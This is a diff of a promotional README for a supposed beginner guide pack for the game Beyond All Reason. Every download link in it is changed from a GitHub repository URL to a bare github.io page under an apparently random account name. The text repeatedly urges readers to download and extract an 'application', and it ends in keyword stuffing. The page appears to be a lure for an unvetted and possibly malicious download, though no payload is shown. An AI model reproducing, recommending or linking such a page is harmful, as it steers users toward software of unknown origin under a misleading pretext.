@@ -1,12 +1,12 @@
 # 🎮 bar-beginner-guide-pack-2026 - Your Fastest Path to BAR Mastery
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20The%20Pack-blue?style=for-the-badge&logo=github)](https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-Get%20The%20Pack-blue?style=for-the-badge&logo=github)](https://frockseriousness3243.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to the **BAR Beginner Guide Pack 2026** – the complete starter kit designed to take you from complete newbie to confident commander in Beyond All Reason (BAR). This pack bundles everything you need to jump into your first match without feeling lost or overwhelmed.
 
-Visit this link to download the application: [https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026](https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026)
+Visit this link to download the application: [https://frockseriousness3243.github.io](https://frockseriousness3243.github.io)
 
 ## 📦 What's Inside This Pack
 
@@ -41,7 +41,7 @@ This isn't just a collection of random files – it's a carefully curated system
 
 Getting started takes less than five minutes. Here's what you need to do:
 
-1. **Download the pack** by visiting [https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026](https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026)
+1. **Download the pack** by visiting [https://frockseriousness3243.github.io](https://frockseriousness3243.github.io)
 2. **Save the file** to a location you can easily find (like your Desktop or Downloads folder)
 3. **Extract the contents** if your browser downloaded a compressed file
 4. **Open the main folder** and you'll see all the components organized by category
@@ -134,6 +134,6 @@ Every expert BAR player was once a beginner. The difference is they had the righ
 
 Don't spend hours searching forums and watching confusing tutorials. Get this pack, follow the guide, and you'll be commanding your armies with confidence in no time.
 
-**Ready to start your journey?** Visit [https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026](https://github.com/Frockseriousness3243/bar-beginner-guide-pack-2026) and download your pack today. Your future victories start now!
+**Ready to start your journey?** Visit [https://frockseriousness3243.github.io](https://frockseriousness3243.github.io) and download your pack today. Your future victories start now!
 
 Keywords: 2026, armada, bar, beginner, beyond-all-reason, build-order, camera, config, cortex, economy, free, guide, hotkeys, keybinds, new-player, rts, spring, starter, strategy, windows
